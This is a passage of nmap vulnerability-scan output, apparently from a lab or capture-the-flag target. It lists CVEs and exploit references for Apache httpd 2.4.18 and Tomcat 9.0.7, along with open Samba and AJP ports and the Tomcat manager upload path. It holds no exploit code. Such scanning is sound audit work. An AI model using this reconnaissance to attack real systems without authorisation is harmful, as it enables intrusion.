\tMSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/FREEBSD-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/\t6.8\tvulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/\t6.8\tvulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tFDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8\t6.8\tvulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8\t*EXPLOIT*\n|     \tCVE-2021-40438\t6.8\tvulners.com/cve/CVE-2021-40438\n|     \tCVE-2020-35452\t6.8\tvulners.com/cve/CVE-2020-35452\n|     \tCVE-2018-1312\t6.8\tvulners.com/cve/CVE-2018-1312\n|     \tCVE-2017-15715\t6.8\tvulners.com/cve/CVE-2017-15715\n|     \t4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332\t6.8\tvulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332\t*EXPLOIT*\n|     \tCVE-2019-10082\t6.4\tvulners.com/cve/CVE-2019-10082\n|     \tCVE-2017-9788\t6.4\tvulners.com/cve/CVE-2017-9788\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/\t6.0\tvulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/\t6.0\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/\t*EXPLOIT*\n|     \tCVE-2019-0217\t6.0\tvulners.com/cve/CVE-2019-0217\n|     \tEDB-ID:47689\t5.8\tvulners.com/exploitdb/EDB-ID:47689\t*EXPLOIT*\n|     \tCVE-2020-1927\t5.8\tvulners.com/cve/CVE-2020-1927\n|     \tCVE-2019-10098\t5.8\tvulners.com/cve/CVE-2019-10098\n|     \t1337DAY-ID-33577\t5.8\tvulners.com/zdt/1337DAY-ID-33577\t*EXPLOIT*\n|     \tCVE-2016-5387\t5.1\tvulners.com/cve/CVE-2016-5387\n|     \tSSV:96537\t5.0\tvulners.com/seebug/SSV:96537\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1333/\t5.0\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1303/\t5.0\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/\t5.0\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/\t5.0\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/\t5.0\tvulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/\t*EXPLOIT*\n|     \tMSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED\t5.0\tvulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED\t*EXPLOIT*\n|     \tEXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D\t5.0\tvulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D\t*EXPLOIT*\n|     \tEXPLOITPACK:2666FB0676B4B582D689921651A30355\t5.0\tvulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355\t*EXPLOIT*\n|     \tEDB-ID:40909\t5.0\tvulners.com/exploitdb/EDB-ID:40909\t*EXPLOIT*\n|     \tCVE-2021-34798\t5.0\tvulners.com/cve/CVE-2021-34798\n|     \tCVE-2021-33193\t5.0\tvulners.com/cve/CVE-2021-33193\n|     \tCVE-2021-26690\t5.0\tvulners.com/cve/CVE-2021-26690\n|     \tCVE-2020-1934\t5.0\tvulners.com/cve/CVE-2020-1934\n|     \tCVE-2019-17567\t5.0\tvulners.com/cve/CVE-2019-17567\n|     \tCVE-2019-0220\t5.0\tvulners.com/cve/CVE-2019-0220\n|     \tCVE-2019-0196\t5.0\tvulners.com/cve/CVE-2019-0196\n|     \tCVE-2018-17199\t5.0\tvulners.com/cve/CVE-2018-17199\n|     \tCVE-2018-17189\t5.0\tvulners.com/cve/CVE-2018-17189\n|     \tCVE-2018-1333\t5.0\tvulners.com/cve/CVE-2018-1333\n|     \tCVE-2018-1303\t5.0\tvulners.com/cve/CVE-2018-1303\n|     \tCVE-2017-9798\t5.0\tvulners.com/cve/CVE-2017-9798\n|     \tCVE-2017-15710\t5.0\tvulners.com/cve/CVE-2017-15710\n|     \tCVE-2016-8743\t5.0\tvulners.com/cve/CVE-2016-8743\n|     \tCVE-2016-8740\t5.0\tvulners.com/cve/CVE-2016-8740\n|     \tCVE-2016-4979\t5.0\tvulners.com/cve/CVE-2016-4979\n|     \t1337DAY-ID-28573\t5.0\tvulners.com/zdt/1337DAY-ID-28573\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/\t4.9\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/\t*EXPLOIT*\n|     \tCVE-2019-0197\t4.9\tvulners.com/cve/CVE-2019-0197\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1302/\t4.3\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1301/\t4.3\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2019-10092/\t4.3\tvulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/\t4.3\tvulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/\t4.3\tvulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/\t*EXPLOIT*\n|     \tEDB-ID:47688\t4.3\tvulners.com/exploitdb/EDB-ID:47688\t*EXPLOIT*\n|     \tCVE-2020-11985\t4.3\tvulners.com/cve/CVE-2020-11985\n|     \tCVE-2019-10092\t4.3\tvulners.com/cve/CVE-2019-10092\n|     \tCVE-2018-1302\t4.3\tvulners.com/cve/CVE-2018-1302\n|     \tCVE-2018-1301\t4.3\tvulners.com/cve/CVE-2018-1301\n|     \tCVE-2018-11763\t4.3\tvulners.com/cve/CVE-2018-11763\n|     \tCVE-2016-4975\t4.3\tvulners.com/cve/CVE-2016-4975\n|     \tCVE-2016-1546\t4.3\tvulners.com/cve/CVE-2016-1546\n|     \t4013EC74-B3C1-5D95-938A-54197A58586D\t4.3\tvulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D\t*EXPLOIT*\n|     \t1337DAY-ID-33575\t4.3\tvulners.com/zdt/1337DAY-ID-33575\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/\t3.5\tvulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/\t*EXPLOIT*\n|     \tCVE-2018-1283\t3.5\tvulners.com/cve/CVE-2018-1283\n|     \tCVE-2016-8612\t3.3\tvulners.com/cve/CVE-2016-8612\n|     \tPACKETSTORM:152441\t0.0\tvulners.com/packetstorm/PACKETSTORM:152441\t*EXPLOIT*\n|     \tEDB-ID:46676\t0.0\tvulners.com/exploitdb/EDB-ID:46676\t*EXPLOIT*\n|     \tEDB-ID:42745\t0.0\tvulners.com/exploitdb/EDB-ID:42745\t*EXPLOIT*\n|     \t1337DAY-ID-663\t0.0\tvulners.com/zdt/1337DAY-ID-663\t*EXPLOIT*\n|     \t1337DAY-ID-601\t0.0\tvulners.com/zdt/1337DAY-ID-601\t*EXPLOIT*\n|     \t1337DAY-ID-4533\t0.0\tvulners.com/zdt/1337DAY-ID-4533\t*EXPLOIT*\n|     \t1337DAY-ID-3109\t0.0\tvulners.com/zdt/1337DAY-ID-3109\t*EXPLOIT*\n|_    \t1337DAY-ID-2237\t0.0\tvulners.com/zdt/1337DAY-ID-2237\t*EXPLOIT*\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-jsonp-detection: Couldn&#039;t find any JSONP endpoints.\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n139/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n8009/tcp open  ajp13       syn-ack ttl 61 Apache Jserv (Protocol v1.3)\n8080/tcp open  http        syn-ack ttl 61 Apache Tomcat 9.0.7\n| http-enum: \n|   /examples/: Sample scripts\n|   /manager/html/upload: Apache Tomcat (401 )\n|   /manager/html: Apache Tomcat (401 )\n|_  /docs/: Potentially interesting folder\n|_http-jsonp-detection: Couldn&#039;t find any JSONP endpoints.\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n| vulners: \n|   cpe:/a:apache:tomcat:9.0.7: \n|     \tB41082A1-4177-53E2-A74C-8ABA13AA3E86\t10.0\tvulners.com/githubexploit/B41082A1-4177-53E2-A74C-8ABA13AA3E86\t*EXPLOIT*\n|     \tTOMCAT:5FF617CEB667027ABB70FDFB3A8FFD4C\t9.3\tvulners.com/tomcat/TOMCAT:5FF617CEB667027ABB70FDFB3A8FFD4C\n|     \tSMNTC-107906\t9.3\tvulners.com/symantec/SMNTC-107906\n|     \tPACKETSTORM:153506\t9.3\tvulners.com/packetstorm/PACKETSTORM:153506\t*EXPLOIT*\n|     \tMSF:EXPLOIT/WINDOWS/HTTP/TOMCAT_CGI_CMDLINEARGS\t9.3\tvulners.com/metasploit/MSF:EXPLOIT/WINDOWS/HTTP/TOMCAT_CGI_CMDLINEARGS\t*EXPLOIT*\n|     \tEDB-ID:47073\t9.3\tvulners.com/exploitdb/EDB-ID:47073\t*EXPLOIT*\n|     \tDB8D8364-06FB-55E8-934E-C013B00821B5\t9.3\tvulners.com/githubexploit/DB8D8364-06FB-55E8-934E-C013B00821B5\t*EXPLOIT*\n|     \t3A26C086-A741-585B-8FA9-F90780E2CA16\t9.3\tvulners.com/githubexploit/3A26C086-A741-585B-8FA9-F90780E2CA16\t*EXPLOIT*\n|     \t1337DAY-ID-32925\t9.3\tvulners.com/zdt/1337DAY-ID-32925\t*EXPLOIT*\n|     \tTOMCAT:BE665F9148D024F7474C0628515C3A37\t7.5\tvulners.com/tomcat/TOMCAT:BE665F9148D024F7474C0628515C3A37\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-8014/\t7.5\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-8014/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE_LINUX-CVE-2020-1938/\t7.5\tvulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2020-1938/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1938/\t7.5\tvulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1938/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON_LINUX-CVE-2020-1938/\t7.5\tvulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2020-1938/\t*EXPLOIT*\n|     \tEDB-ID:49039\t7.5\tvulners.com/exploitdb/EDB-ID:49039\t*EXPLOIT*\n|     \tCVE-2020-1938\t7.5\tvulners.com/cve/CVE-2020-1938\n|     \tCVE-2018-8014\t7.5\tvulners.com/cve/CVE-2018-8014\n|     \tC3759325-98F9-5F0F-98F5-6EAE787CE3FB\t7.5\tvulners.com/githubexploit/C3759325-98F9-5F0F-98F5-6EAE787CE3FB\t*EXPLOIT*\n|     \t7130E91B-2DF2-565E-ADE8-4C60D45E5A4D\t7.5\tvulners.com/githubexploit/7130E91B-2DF2-565E-ADE8-4C60D45E5A4D\t*EXPLOIT*\n|     \t6E0425A5-AA6D-5FC6-9F8C-415345C30DD5\t7.5\tvulners.com/githubexploit/6E0425A5-AA6D-5FC6-9F8C-415345C30DD5\t*EXPLOIT*\n|     \t1638D72C-F3EB-52FB-B16F-5F1996A67C0A\t7.5\tvulners.com/githubexploit/1638D72C-F3EB-52FB-B16F-5F1996A67C0A\t*EXPLOIT*\n|     \t140968B5-6F8E-57C6-8A61-831D5FB78836\t7.5\tvulners.com/githubexploit/140968B5-6F8E-57C6-8A61-831D5FB78836\t*EXPLOIT*\n|     \t0B52DD25-4874-54EB-8213-8FA10B0966A3\t7.5\tvulners.com/githubexploit/0B52DD25-4874-54EB-8213-8FA10B0966A3\t*EXPLOIT*\n|     \tTOMCAT:3535F2AFC77921EE4AD662129D83A68D\t5.8\tvulners.com/tomcat/TOMCAT:3535F2AFC77921EE4AD662129D83A68D\n|     \tCVE-2021-30640\t5.8\tvulners.com/cve/CVE-2021-30640\n|     \tCVE-2020-1935\t5.8\tvulners.com/cve/CVE-2020-1935\n|     \tTOMCAT:34D1BB5AAB77A4FA5A232BB1CC1DBE12\t5.1\tvulners.com/tomcat/TOMCAT:34D1BB5AAB77A4FA5A232BB1CC1DBE12\n|     \tMSF:ILITIES/ORACLE_LINUX-CVE-2019-17563/\t5.1\tvulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2019-17563/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-17563/\t5.1\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-17563/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON_LINUX-CVE-2019-17563/\t5.1\tvulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-17563/\t*EXPLOIT*\n|     \tCVE-2019-17563\t5.1\tvulners.com/cve/CVE-2019-17563\n|     \tTOMCAT:E0D7CC4566625A34425D5CE3D847746F\t5.0\tvulners.com/tomcat/TOMCAT:E0D7CC4566625A34425D5CE3D847746F\n|     \tTOMCAT:C878975BAAD7823EE793B63FC6053125\t5.0\tvulners.com/tomcat/TOMCAT:C878975BAAD7823EE793B63FC6053125\n|     \tTOMCAT:C3F367059A3E9B8636ED41FF901D93F9\t5.0\tvulners.com/tomcat/TOMCAT:C3F367059A3E9B8636ED41FF901D93F9\n|     \tTOMCAT:A0B0592E070D3A4A393867C40FBB81D8\t5.0\tvulners.com/tomcat/TOMCAT:A0B0592E070D3A4A393867C40FBB81D8\n|     \tTOMCAT:42FCCA1B939943E71978F85565FFC5D2\t5.0\tvulners.com/tomcat/TOMCAT:42FCCA1B939943E71978F85565FFC5D2\n|     \tTOMCAT:3C894B78CB6026265DCB4F6CBB52E528\t5.0\tvulners.com/tomcat/TOMCAT:3C894B78CB6026265DCB4F6CBB52E528\n|     \tTOMCAT:324E50A03961FCE2265C4097A2D9383A\t5.0\tvulners.com/tomcat/TOMCAT:324E50A03961FCE2265C4097A2D9383A\n|     \tTOMCAT:1ACD2AE0B03FBB401CCE27D5C801BE3B\t5.0\tvulners.com/tomcat/TOMCAT:1ACD2AE0B03FBB401CCE27D5C801BE3B\n|     \tTOMCAT:045D264F03959F4DF2D140C7A3C6A05B\t5.0\tvulners.com/tomcat/TOMCAT:045D264F03959F4DF2D140C7A3C6A05B\n|     \tTOMCAT:03526B264C3CCDD4C74F8B8FBF02E5E4\t5.0\tvulners.com/tomcat/TOMCAT:03526B264C3CCDD4C74F8B8FBF02E5E4\n|     \tSSV:99316\t5.0\tvulners.com/seebug/SSV:99316\t*EXPLOIT*\n|     \tSMNTC-108874\t5.0\tvulners.com/symantec/SMNTC-108874\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-8034/\t5.0\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-8034/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1336/\t5.0\tvulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1336/\t*EXPLOIT*\n|     \tCVE-2021-42340\t5.0\tvulners.com/cve/CVE-2021-42340\n|     \tCVE-2021-33037\t5.0\tvulners.com/cve/CVE-2021-33037\n|     \tCVE-2021-25122\t5.0\tvulners.com/cve/CVE-2021-25122\n|     \tCVE-2020-17527\t5.0\tvulners.com/cve/CVE-2020-17527\n|     \tCVE-2020-13935\t5.0\tvulners.com/cve/CVE-2020-13935\n|     \tCVE-2020-13934\t5.0\tvulners.com/cve/CVE-2020-13934\n|     \tCVE-2020-11996\t5.0\tvulners.com/cve/CVE-2020-11996\n|     \tCVE-2019-10072\t5.0\tvulners.com/cve/CVE-2019-10072\n|     \tCVE-2019-0199\t5.0\tvulners.com/cve/CVE-2019-0199\n|     \tCVE-2018-8034\t5.0\tvulners.com/cve/CVE-2018-8034\n|     \tCVE-2018-1336\t5.0\tvulners.com/cve/CVE-2018-1336\n|     \t18F5237C-DCAC-5831-AED6-F0880A11DFF2\t5.0\tvulners.com/githubexploit/18F5237C-DCAC-5831-AED6-F0880A11DFF2\t*EXPLOIT*\n|     \tTOMCAT:F551C8E09F0122E8322CF8CB981AC710\t4.4\tvulners.com/tomcat/TOMCAT:F551C8E09F0122E8322CF8CB981AC710\n|     \tTOMCAT:A01991EC43D0F6A28E9CB4553C6B4670\t4.4\tvulners.com/tomcat/TOMCAT:A01991EC43D0F6A28E9CB4553C6B4670\n|     \tMSF:ILITIES/SUSE-CVE-2019-12418/\t4.4\tvulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-12418/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-12418/\t4.4\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-12418/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-12418/\t4.4\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-12418/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-12418/\t4.4\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-12418/\t*EXPLOIT*\n|     \tF60737C1-A24B-51C1-AE8D-73A65C778FFF\t4.4\tvulners.com/githubexploit/F60737C1-A24B-51C1-AE8D-73A65C778FFF\t*EXPLOIT*\n|     \tE95D9A0E-E9DE-5D95-9879-E07C0257318C\t4.4\tvulners.com/githubexploit/E95D9A0E-E9DE-5D95-9879-E07C0257318C\t*EXPLOIT*\n|     \tD5CBA0E2-A4B0-52CE-B93B-F433CE8662DA\t4.4\tvulners.com/githubexploit/D5CBA0E2-A4B0-52CE-B93B-F433CE8662DA\t*EXPLOIT*\n|     \tCVE-2021-25329\t4.4\tvulners.com/cve/CVE-2021-25329\n|     \tCVE-2020-9484\t4.4\tvulners.com/cve/CVE-2020-9484\n|     \tCVE-2019-12418\t4.4\tvulners.com/cve/CVE-2019-12418\n|     \tC4EDB405-454C-5160-9A99-21A930740C3F\t4.4\tvulners.com/githubexploit/C4EDB405-454C-5160-9A99-21A930740C3F\t*EXPLOIT*\n|     \tB0BA17F5-F171-5C97-9F6C-D5F38B5B64F5\t4.4\tvulners.com/githubexploit/B0BA17F5-F171-5C97-9F6C-D5F38B5B64F5\t*EXPLOIT*\n|     \t743F51FB-8BF4-5425-AEFA-10B2A14C8F3B\t4.4\tvulners.com/githubexploit/743F51FB-8BF4-5425-AEFA-10B2A14C8F3B\t*EXPLOIT*\n|     \t5602A60A-886A-598C-99B3-EE2E820506AD\t4.4\tvulners.com/githubexploit/5602A60A-886A-598C-99B3-EE2E820506AD\t*EXPLOIT*\n|     \t504D019A-423C-50A0-9677-93192F0ECDFC\t4.4\tvulners.com/githubexploit/504D019A-423C-50A0-9677-93192F0ECDFC\t*EXPLOIT*\n|     \t4278B435-D22E-57E8-ABC4-639BAAFA6FC9\t4.4\tvulners.com/githubexploit/4278B435-D22E-57E8-ABC4-639BAAFA6FC9\t*EXPLOIT*\n|     \t14CD7401-C309-52B2-B4EE-AD54900F0455\t4.4\tvulners.com/githubexploit/14CD7401-C309-52B2-B4EE-AD54900F0455\t*EXPLOIT*\n|     \tTOMCAT:6B8125EDA215F510A527D712FEF3FF0A\t4.3\tvulners.com/tomcat/TOMCAT:6B8125EDA215F510A527D712FEF3FF0A\n|     \tTOMCAT:1CE79F1FB24CB690F26B87530FB0DBF3\t4.3\tvulners.com/tomcat/TOMCAT:1CE79F1FB24CB690F26B87530FB0DBF3\n|     \tSMNTC-105524\t4.3\tvulners.com/symantec/SMNTC-105524\n|     \tPACKETSTORM:163457\t4.3\tvulners.com/packetstorm/PACKETSTORM:163457\t*EXPLOIT*\n|     \tPACKETSTORM:163456\t4.3\tvulners.com/packetstorm/PACKETSTORM:163456\t*EXPLOIT*\n|     \tMSF:ILITIES/JRE-VULN-CVE-2019-2684/\t4.3\tvulners.com/metasploit/MSF:ILITIES/JRE-VULN-CVE-2019-2684/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-JAVA-CVE-2019-2684/\t4.3\tvulners.com/metasploit/MSF:ILITIES/IBM-JAVA-CVE-2019-2684/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-AIX-CVE-2019-2684/\t4.3\tvulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-2684/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-0221/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-0221/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-2684/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-2684/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-2684/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-2684/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-0221/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-0221/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-2684/\t4.3\tvulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-2684/\t*EXPLOIT*\n|     \tMSF:ILITIES/GENTOO-LINUX-CVE-2019-2684/\t4.3\tvulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-2684/\t*EXPLOIT*\n|     \tMSF:ILITIES/GENTOO-LINUX-CVE-2019-0221/\t4.3\tvulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-0221/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2019-2684/\t4.3\tvulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-2684/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-2684/\t4.3\tvulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-2684/\t*EXPLOIT*\n|     \tEDB-ID:50119\t4.3\tvulners.com/exploitdb/EDB-ID:50119\t*EXPLOIT*\n|     \tEDB-ID:50118\t4.3\tvulners.com/exploitdb/EDB-ID:50118\t*EXPLOIT*\n|     \tCVE-2021-41079\t4.3\tvulners.com/cve/CVE-2021-41079\n|     \tCVE-2021-24122\t4.3\tvulners.com/cve/CVE-2021-24122\n|     \tCVE-2019-0221\t4.3\tvulners.com/cve/CVE-2019-0221\n|     \tCVE-2018-8037\t4.3\tvulners.com/cve/CVE-2018-8037\n|     